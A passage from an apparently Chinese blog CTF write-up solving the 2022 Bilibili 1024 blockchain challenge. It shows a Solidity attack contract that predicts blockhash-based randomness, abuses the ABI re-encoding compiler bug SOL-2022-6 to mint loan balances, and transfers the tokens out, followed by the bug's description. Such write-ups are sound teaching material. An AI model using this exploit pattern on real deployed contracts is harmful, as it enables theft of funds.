function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 满足 ethbalances [msg.sender] >= 1</span></pre></td></tr><tr><td data-num="14"></td><td><pre> </pre></td></tr><tr><td data-num="15"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 得到两个_balances</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">auth1</span><span class="token punctuation">(</span><span class="token number">22331024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 第一个验证</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token builtin">uint</span> answer <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">auth2</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 第二个验证</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>        SignCoupon <span class="token keyword">memory</span> scoupon<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>loankey<span class="token operator">=</span><span class="token number">2233</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>amount<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">testborrowtwice</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获得_ebalances 300 个</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 用_ebalances 去换_balances 302 个</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">adrress</span><span class="token punctuation">(</span>你自己的账户地址<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 给你的大号转账_balances 302 个</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里简单说明一下为什么将 <code>scoupon.coupon.loankey</code>  赋值为 2233 通过 <code>testborrowtwice</code>  后，在 <code>flashloan</code>  函数中 <code>scoupon.coupon.loankey</code>  又变为 0, 这由于 solidity0.8.12 编译器自身原因导致了这个 bug, 从而使得第一个成员变量的值清零，在 solidity0.8.16 后这个<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnNvbGlkaXR5bGFuZy5vcmcvZW4vdjAuOC4xNi9idWdzLmh0bWw=">问题</span>得到了修复.</p>
<p><strong>贴一下 bug 描述</strong></p>
<figure class="highlight json"><figcaption data-lang="JSON"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token property">"uid"</span><span class="token operator">:</span> <span class="token string">"SOL-2022-6"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"AbiReencodingHeadOverflowWithStaticArrayCleanup"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"ABI-encoding a tuple with a statically-sized calldata array in the last component would corrupt 32 leading bytes of its first dynamically encoded component."</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"When ABI-encoding a statically-sized calldata array, the compiler always pads the data area to a multiple of 32-bytes and ensures that the padding bytes are zeroed. In some cases, this cleanup used to be performed by always writing exactly 32 bytes, regardless of how many needed to be zeroed. This was done with the assumption that the data that would eventually occupy the area past the end of the array had not yet been written, because the encoder processes tuple components in the order they were given. While this assumption is mostly true, there is an important corner case: dynamically encoded tuple components are stored separately from the statically-sized ones in an area called the *tail* of the encoding and the tail immediately follows the *head*, which is where the statically-sized components are placed. The aforementioned cleanup, if performed for the last component of the head would cross into the tail and overwrite up to 32 bytes of the first component stored there with zeros. The only array type for which the cleanup could actually result in an overwrite were arrays with ``uint256`` or ``bytes32`` as the base element type and in this case the size of the corrupted area was always exactly 32 bytes. The problem affected tuples at any nesting level. This included also structs, which are encoded as tuples in the ABI. Note also that lists of parameters and return values of functions, events and errors are encoded as tuples."</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token property">"introduced"</span><span class="token operator">:</span> <span class="token string">"0.5.8"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token property">"fixed"</span><span class="token operator">:</span> <span class="token string">"0.8.16"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token string">"medium"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token property">"conditions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token property">"ABIEncoderV2"</span><span class="token operator">:</span> <span class="token boolean">true</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><hr>
<h3 id="结语"><a class="anchor" href="#结语">#</a> 结语</h3>
<p>至此，这第四题区块链的解答就到此结束了</p>
<p>说一说感受吧，每次做区块链的题目都感觉特别有意思，其实本人过去是学习逆向工程的，今年才开始接触区块链，解区块链题目的过程说实话，和逆向分析真的好像哇，都是一个逆向的过程，分析需要满足的条件，然后设法编写合约来让条件得到满足，最终满足所有需要的条件之后获得 flag , 好玩好玩，嘿嘿 (●ˇ∀ˇ●)</p>

      <div class="tags">
          <a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a>
          <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag"><i class="ic i-tag"></i> 智能合约</a>
          <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag"><i class="ic i-tag"></i> 区块链</a>
          <a href="/tags/solidity/" rel="tag"><i class="ic i-tag"></i> solidity</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2025-04-09 02:55:11" itemprop="dateModified" datetime="2025-04-09T02:55:11+08:00">2025-04-09</time>
  </span>
  <span id="2022哔哩哔哩_1024程序员节_T4_区块链详解/" class="item leancloud_visitors" data-flag-title="2022哔哩哔哩 1024程序员节 T4 区块链详解" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>oacia <i class="ic i-at"><em>@</em></i>oaciaのBbBlog~
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/" title="2022哔哩哔哩 1024程序员节 T4 区块链详解">https://oacia.dev/2022哔哩哔哩_1024程序员节_T4_区块链详解/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/solidity-learning/" itemprop="url" rel="prev" data-background-image="&#x2F;picture&#x2F;602214.webp" title="solidity语言学习">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>solidity语言学习</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/%E7%94%A8c%E8%B0%83%E7%94%A8python/" itemprop="url" rel="next" data-background-image="&#x2F;picture&#x2F;147417.webp" title="在C语言中调用Python">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>在C语言中调用Python</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-text"> 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%98%8E%E7%A1%AE%E7%9B%AE%E6%A0%87"><span class="toc-text"> 1. 明确目标</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%9D%A1%E4%BB%B6"><span class="toc-text"> 第一个条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%9D%A1%E4%BB%B6"><span class="toc-text"> 第二个条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E7%BC%96%E5%86%99%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-text"> 2. 编写攻击合约</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-text"> 方法①</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-text"> 方法②</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text"> 结语</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="oacia"
      data-src="/images/avatar.jpg">
  
  <svg class="logo-overview" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 540.19 380.99">
    <g id="clips" fill= #00a99d; stroke="none">
      <clipPath id="o">
        <path d="M93.57,284c8,0,14.91-1,20.75-3,5.83-2,10.41-3.66,13.75-5,4.66-1.66,6.16-.75,4.5,2.75-1.67,3.5-4.67,6.42-9,8.75-2.34,1.34-6.09,2.84-11.25,4.5-5.17,1.67-11.09,2.5-17.75,2.5-.34,8.67-3.34,16.84-9,24.5-5.67,7.67-13.34,13.34-23,17-6,2.34-12.17,3.59-18.5,3.75-6.34,.17-12.17-.66-17.5-2.5-5.34-1.83-10.09-4.66-14.25-8.5-4.17-3.83-7.25-8.41-9.25-13.75-2-5.33-2.83-11-2.5-17s1.83-11.83,4.5-17.5c2.66-5.66,6.33-10.75,11-15.25,4.66-4.5,10.16-7.75,16.5-9.75,5.66-1.66,11.41-1.66,17.25,0,5.83,1.67,10.08,4.34,12.75,8,1.66,2.67,2.5,5.67,2.5,9,3-2,6.33-3,10-3h1c3.33,0,6.5,.84,9.5,2.5,3,1.67,5.33,4.5,7,8.5l1,3.5Zm-34,39.5c5.66-.66,10.33-3.83,14-9.5,3.66-5.66,5.33-12.16,5-19.5-4.67,.34-9.09-.41-13.25-2.25-4.17-1.83-6.42-4.58-6.75-8.25-.67-3,0-5.5,2-7.5-.67-2.66-2.75-5-6.25-7s-7.09-2.16-10.75-.5c-4.67,2-8.25,5.84-10.75,11.5-2.5,5.67-3.09,11.84-1.75,18.5,1.33,8,4.75,14.34,10.25,19,5.5,4.67,11.58,6.5,18.25,5.5Z"/>
      </clipPath>
      <clipPath id="a1">
        <path d="M176.06,270c5,4,8.5,9.17,10.5,15.5,.66-1.33,1.25-2.33,1.75-3,.5-.66,1.08-1.33,1.75-2,3.66-2.66,8-3.08,13-1.25,5,1.84,8.5,4.09,10.5,6.75,1,1.34,1.41,2.75,1.25,4.25-.17,1.5-.5,3.42-1,5.75-.5,2.34-1,5.09-1.5,8.25-.5,3.17-.42,6.92,.25,11.25,.33,3.67,1.25,6.5,2.75,8.5s3.16,3.25,5,3.75c1.83,.5,3.75,.34,5.75-.5,2-.83,3.83-2.08,5.5-3.75,3-3.66,5.75-7.66,8.25-12,2.5-4.33,4.25-8.16,5.25-11.5,1.33-3.66,3.41-5.25,6.25-4.75,2.83,.5,3.58,3.09,2.25,7.75-1.34,4.67-3,8.92-5,12.75-2,3.84-5.17,8.59-9.5,14.25-4.67,5.67-11.34,9.59-20,11.75-8.67,2.17-17.67,.42-27-5.25-5-3.33-8.34-8.83-10-16.5-.67,1.34-2,3.34-4,6-3.67,4.67-7.84,8.59-12.5,11.75-4.67,3.17-9.42,5.34-14.25,6.5-4.84,1.17-9.59,1.34-14.25,.5-4.67-.83-9-2.75-13-5.75-7.67-6-11.75-14.33-12.25-25-.5-10.66,2.91-20.83,10.25-30.5,7.33-9.66,16.25-15.75,26.75-18.25s19.58-.91,27.25,4.75Zm-25,60c4.66,1.67,9.66,.17,15-4.5,5.33-4.66,9.33-10.83,12-18.5,2.33-6.66,2.58-12.5,.75-17.5-1.84-5-5.09-8.33-9.75-10-4.67-1.66-9.34-1.33-14,1-4.67,2.34-8.34,7.34-11,15-3,7.67-3.84,14.92-2.5,21.75,1.33,6.84,4.5,11.09,9.5,12.75Z"/>
      </clipPath>
      <clipPath id="c">
        <path d="M250.06,280.5c4.66-7.66,12-13.16,22-16.5,10-3.33,19.83-3.66,29.5-1,7.66,2.34,13.5,5.67,17.5,10,4,4.34,5.83,8.5,5.5,12.5-.34,4.67-2.25,8.59-5.75,11.75-3.5,3.17-7.09,5.34-10.75,6.5-3.67,1.17-6.84,1.25-9.5,.25-2.67-1-3.34-3.16-2-6.5,2.66-8,2.75-14.58,.25-19.75-2.5-5.16-5.92-6.41-10.25-3.75-2.67,1.67-5,4.09-7,7.25-2,3.17-3.5,6.75-4.5,10.75s-1.42,8.09-1.25,12.25c.16,4.17,.75,7.92,1.75,11.25,1.33,4,3.66,7.42,7,10.25,3.33,2.84,7.16,4.67,11.5,5.5,4.33,.84,8.91,.67,13.75-.5,4.83-1.16,9.25-3.75,13.25-7.75,7.33-6.66,12.33-14.33,15-23,.33-1.66,1.16-2.91,2.5-3.75,1.33-.83,2.5-1.08,3.5-.75,1,.34,1.83,1.09,2.5,2.25,.66,1.17,.66,2.92,0,5.25-2.34,9.34-6.34,17-12,23-4.67,5.67-10.5,10.42-17.5,14.25-7,3.84-14.25,6.09-21.75,6.75-7.5,.67-14.84-.33-22-3-7.17-2.66-13.25-7.5-18.25-14.5-6-8.66-8.75-17.66-8.25-27,.5-9.33,2.25-16.66,5.25-22Z"/>
      </clipPath>
      <clipPath id="i_b">
        <path d="M393.06,330c-2.34,2.67-5.17,5.09-8.5,7.25-3.34,2.17-7.09,3.59-11.25,4.25-4.17,.67-8.59,.67-13.25,0-4.67-.66-9.17-2.33-13.5-5-4.67-2.66-7.67-7.58-9-14.75-1.34-7.16-1.83-14.66-1.5-22.5,.33-7.83,1.33-14.91,3-21.25,1.66-6.33,3.33-10.16,5-11.5,3.66-2.66,8-3.08,13-1.25,5,1.84,8.5,4.09,10.5,6.75,1,1.34,1.41,3.59,1.25,6.75-.17,3.17-.5,6.92-1,11.25-.5,4.34-1.09,8.92-1.75,13.75-.67,4.84-.67,9.42,0,13.75,.33,3.67,1.33,6.42,3,8.25,1.66,1.84,3.5,2.84,5.5,3,2,.17,4-.25,6-1.25s3.83-2.33,5.5-4c3-3.66,5.66-7.66,8-12,2.33-4.33,4.16-8.16,5.5-11.5,1-3.66,2.91-5.25,5.75-4.75,2.83,.5,3.75,3.09,2.75,7.75-1.34,4.67-3,8.92-5,12.75-2,3.84-5.34,8.59-10,14.25Z"/>
      </clipPath>
      <clipPath id="a2">
        <path d="M461.56,270c5,4,8.5,9.17,10.5,15.5,.66-1.33,1.25-2.33,1.75-3,.5-.66,1.08-1.33,1.75-2,3.66-2.66,8-3.08,13-1.25,5,1.84,8.5,4.09,10.5,6.75,1,1.34,1.41,2.75,1.25,4.25-.17,1.5-.5,3.42-1,5.75-.5,2.34-1,5.09-1.5,8.25-.5,3.17-.42,6.92,.25,11.25,.33,3.67,1.25,6.5,2.75,8.5s3.16,3.25,5,3.75c1.83,.5,3.75,.34,5.75-.5,2-.83,3.83-2.08,5.5-3.75,3-3.66,5.75-7.66,8.25-12,2.5-4.33,4.25-8.16,5.25-11.5,1.33-3.66,3.41-5.25,6.25-4.75,2.83,.5,3.58,3.09,2.25,7.75-1.34,4.67-3,8.92-5,12.75-2,3.84-5.17,8.59-9.5,14.25-4.67,5.67-11.34,9.59-20,11.75-8.67,2.17-17.67,.42-27-5.25-5-3.33-8.34-8.83-10-16.5-.67,1.34-2,3.34-4,6-3.67,4.67-7.84,8.59-12.5,11.75-4.67,3.17-9.42,5.34-14.25,6.5-4.84,1.17-9.59,1.34-14.25,.5-4.67-.83-9-2.75-13-5.75-7.67-6-11.75-14.33-12.25-25-.5-10.66,2.91-20.83,10.25-30.5,7.33-9.66,16.25-15.75,26.75-18.25s19.58-.91,27.25,4.75Zm-25,60c4.66,1.67,9.66,.17,15-4.5,5.33-4.66,9.33-10.83,12-18.5,2.33-6.66,2.58-12.5,.75-17.5-1.84-5-5.09-8.33-9.75-10-4.67-1.66-9.34-1.33-14,1-4.67,2.34-8.34,7.34-11,15-3,7.67-3.84,14.92-2.5,21.75,1.33,6.84,4.5,11.09,9.5,12.75Z"/>
      </clipPath>
      
    </g>
    <g
      id="strokes"
      fill="none"
      stroke=#96d7f5
      stroke-linecap="round"
      stroke-linejoin="round"
    >
    <path
    clip-path="url(#o)"
    class="oPath path"
    d="M65.07,278.38c-.29-1.76-1.26-6.18-5-10-3.34-3.4-7.07-4.47-9-5-6.95-1.9-12.89,.22-15,1-10.95,4.04-18.33,15.16-20,26-1.42,9.21,1.56,16.56,3,20,1.49,3.55,3.94,9.39,10,14,6.66,5.07,13.73,5.65,18,6,3,.25,9.01,.67,16-2,1.72-.66,5.78-2.38,10-6,.99-.86,4.82-4.25,8-10,2.79-5.06,3.72-9.49,4-11,.39-2.12,1.09-6.93,0-13-1.05-5.85-1.95-10.86-6-13-2.83-1.5-7.27-1.62-10,1-1.73,1.66-2.85,4.55-2,7,1.04,2.99,4.58,4.01,8,5,1.16,.33,2.91,.75,8,1,4.72,.23,8.68,.18,12,0,6.49-.36,9.74-.54,12-1,4.35-.88,7.44-2.14,12-4,4.67-1.9,6.76-3.17,8-4,2.56-1.7,3.95-3.1,5-4,5.5-4.73,12.89-6.48,18-7,6.09-.62,11.96-.21,18,3,4.89,2.6,8.27,6.84,10,9,1.86,2.32,3.15,4.46,4,6"
    stroke-width="32.5"
    ></path>
    <path
      clip-path="url(#a1)"
      class="a1Path path"
      d="M154.07,270.38c-3.73,1.48-11.88,5.3-18,14-4.95,7.03-6.09,13.7-7,19-1.38,8.06-2.81,16.39,2,24,3.93,6.21,9.88,8.58,11,9,7.28,2.76,13.71,.75,16,0,5.19-1.71,8.32-4.6,12-8,2.48-2.29,6.78-6.34,10-13,2.71-5.61,3.51-10.73,4-14,.86-5.79,.57-9.98,1-10,.41-.02,.79,3.69,2,11,1.71,10.28,2.44,11.93,3,13,1.44,2.76,2.62,5.84,7,10,4.73,4.49,8.09,5.74,11,7,6.75,2.92,13.16,1.45,15,1,4.94-1.21,8.2-3.64,10-5,4.09-3.11,6.34-6.48,8-9,2.23-3.4,3.47-6.35,5-10,1.22-2.9,2.18-5.67,3-8,1.52-4.35,1.41-4.5,2-6,1.75-4.46,2-6,7-12,2.31-2.77,6.32-8.54,10-11,3.79-2.54,7-3.81,10-5,5.33-2.12,9-2.17,12-2,5.4,.32,10.2,4.49,12,6,2.31,1.93,6.05,6.97,7,12,.62,3.29-.19,5.13-1,8-.86,3.04-3.06,5.4-4,7"
      stroke-width="59"
    ></path>
    <path
      clip-path="url(#c)"
      class="cPath path"
      d="M273.07,272.38c-3.08,2.79-9.54,9.45-12,20-2.1,9.02-.22,16.29,1,21,1.57,6.05,3.22,12.44,9,18,6.67,6.42,14.58,7.66,17,8,6.36,.9,11.22-.42,17-2,3.68-1,8.59-2.39,14-6,4.13-2.76,6.84-5.67,9-8,3.24-3.49,5.27-6.46,7-9,2.22-3.27,4.18-6.89,8-14,3.39-6.3,5.1-9.5,6-12,1.67-4.63,2.38-8.58,3-12,.72-4,.94-6.77,1-9,.03-1.23,.02-2.26,0-3"
      stroke-width="110"
    ></path>
    <path
      clip-path="url(#i_b)"
      class="i_bPath path"
      d="M355.07,265.38c-1.55,12.11-2.45,22.6-3,31-.66,10.17-.79,16.98,2,25,1.74,5,3.75,10.53,9,13,6.29,2.97,13.34-.3,17-2,6.11-2.83,9.64-6.89,14-12,9.03-10.59,9.67-15.19,10-17,.6-3.32,1.32-6.16,1-8"
      stroke-width="33"
    ></path>
    <path
      clip-path="url(#a2)"
      class="a2Path path"
      d="M470.07,302.38c.32-2.77,.45-7.09-1-12-.98-3.32-5.25-15.49-17-19-12.13-3.62-22.23,4.71-25,7-6.75,5.57-9.28,12.36-11,17-1.68,4.53-5.22,14.03-2,25,1.19,4.05,3.29,11.22,10,15,7.78,4.39,16.49,1.26,20,0,6.31-2.27,10.12-6.13,14-10,4.99-4.97,7.76-9.61,11-15,1.88-3.14,4.54-7.61,7-14,3.15-8.18,3.42-14.06,4-14,.51,.05-.23,7.53,0,19,.07,3.38,.38,6.92,1,14,.41,4.62,.69,7.05,2,10,.82,1.86,2.1,4.74,5,7,4.4,3.43,9.65,3.17,13,3,1.08-.05,5.74-.35,11-3,4.39-2.21,7.04-4.97,9-7,.85-.89,3.48-3.69,6-8,1.51-2.58,1.83-3.87,4-9,1.54-3.64,2.92-6.7,4-9"
      stroke-width="70"
    ></path>
    </g>
    <g
      id="strokes2"
      fill="none"
      stroke=#ff97b8
      stroke-linecap="round"
      stroke-linejoin="round"
    >
      <path
        clip-path="url(#o)"
        class="oPath path"
        d="M65.07,278.38c-.29-1.76-1.26-6.18-5-10-3.34-3.4-7.07-4.47-9-5-6.95-1.9-12.89,.22-15,1-10.95,4.04-18.33,15.16-20,26-1.42,9.21,1.56,16.56,3,20,1.49,3.55,3.94,9.39,10,14,6.66,5.07,13.73,5.65,18,6,3,.25,9.01,.67,16-2,1.72-.66,5.78-2.38,10-6,.99-.86,4.82-4.25,8-10,2.79-5.06,3.72-9.49,4-11,.39-2.12,1.09-6.93,0-13-1.05-5.85-1.95-10.86-6-13-2.83-1.5-7.27-1.62-10,1-1.73,1.66-2.85,4.55-2,7,1.04,2.99,4.58,4.01,8,5,1.16,.33,2.91,.75,8,1,4.72,.23,8.68,.18,12,0,6.49-.36,9.74-.54,12-1,4.35-.88,7.44-2.14,12-4,4.67-1.9,6.76-3.17,8-4,2.56-1.7,3.95-3.1,5-4,5.5-4.73,12.89-6.48,18-7,6.09-.62,11.96-.21,18,3,4.89,2.6,8.27,6.84,10,9,1.86,2.32,3.15,4.46,4,6"
        stroke-width="32.5"
      ></path>
      <path
        clip-path="url(#a1)"
        class="a1Path path"
        d="M154.07,270.38c-3.73,1.48-11.88,5.3-18,14-4.95,7.03-6.09,13.7-7,19-1.38,8.06-2.81,16.39,2,24,3.93,6.21,9.88,8.58,11,9,7.28,2.76,13.71,.75,16,0,5.19-1.71,8.32-4.6,12-8,2.48-2.29,6.78-6.34,10-13,2.71-5.61,3.51-10.73,4-14,.86-5.79,.57-9.98,1-10,.41-.02,.79,3.69,2,11,1.71,10.28,2.44,11.93,3,13,1.44,2.76,2.62,5.84,7,10,4.73,4.49,8.09,5.74,11,7,6.75,2.92,13.16,1.45,15,1,4.94-1.21,8.2-3.64,10-5,4.09-3.11,6.34-6.48,8-9,2.23-3.4,3.47-6.35,5-10,1.22-2.9,2.18-5.67,3-8,1.52-4.35,1.41-4.5,2-6,1.75-4.46,2-6,7-12,2.31-2.77,6.32-8.54,10-11,3.79-2.54,7-3.81,10-5,5.33-2.12,9-2.17,12-2,5.4,.32,10.2,4.49,12,6,2.31,1.93,6.05,6.97,7,12,.62,3.29-.19,5.13-1,8-.86,3.04-3.06,5.4-4,7"
        stroke-width="59"
      ></path>
      <path
        clip-path="url(#c)"
        class="cPath path"
        d="M273.07,272.38c-3.08,2.79-9.54,9.45-12,20-2.1,9.02-.22,16.29,1,21,1.57,6.05,3.22,12.44,9,18,6.67,6.42,14.58,7.66,17,8,6.36,.9,11.22-.42,17-2,3.68-1,8.59-2.39,14-6,4.13-2.76,6.84-5.67,9-8,3.24-3.49,5.27-6.46,7-9,2.22-3.27,4.18-6.89,8-14,3.39-6.3,5.1-9.5,6-12,1.67-4.63,2.38-8.58,3-12,.72-4,.94-6.77,1-9,.03-1.23,.02-2.26,0-3"
        stroke-width="110"
      ></path>
      <path
        clip-path="url(#i_b)"
        class="i_bPath path"
        d="M355.07,265.38c-1.55,12.11-2.45,22.6-3,31-.66,10.17-.79,16.98,2,25,1.74,5,3.75,10.53,9,13,6.29,2.97,13.34-.3,17-2,6.11-2.83,9.64-6.89,14-12,9.03-10.59,9.67-15.19,10-17,.6-3.32,1.32-6.16,1-8"
        stroke-width="33"
      ></path>
      <path
        clip-path="url(#a2)"
        class="a2Path path"
        d="M470.07,302.38c.32-2.77,.45-7.09-1-12-.98-3.32-5.25-15.49-17-19-12.13-3.62-22.23,4.71-25,7-6.75,5.57-9.28,12.36-11,17-1.68,4.53-5.22,14.03-2,25,1.19,4.05,3.29,11.22,10,15,7.78,4.39,16.49,1.26,20,0,6.31-2.27,10.12-6.13,14-10,4.99-4.97,7.76-9.61,11-15,1.88-3.14,4.54-7.61,7-14,3.15-8.18,3.42-14.06,4-14,.51,.05-.23,7.53,0,19,.07,3.38,.38,6.92,1,14,.41,4.62,.69,7.05,2,10,.82,1.86,2.1,4.74,5,7,4.4,3.43,9.65,3.17,13,3,1.08-.05,5.74-.35,11-3,4.39-2.21,7.04-4.97,9-7,.85-.89,3.48-3.69,6-8,1.51-2.58,1.83-3.87,4-9,1.54-3.64,2.92-6.7,4-9"
        stroke-width="70"
      ></path>
    </g>
    <g class="dot-group">
      <path
        id="dot"
        fill=#ff97b8
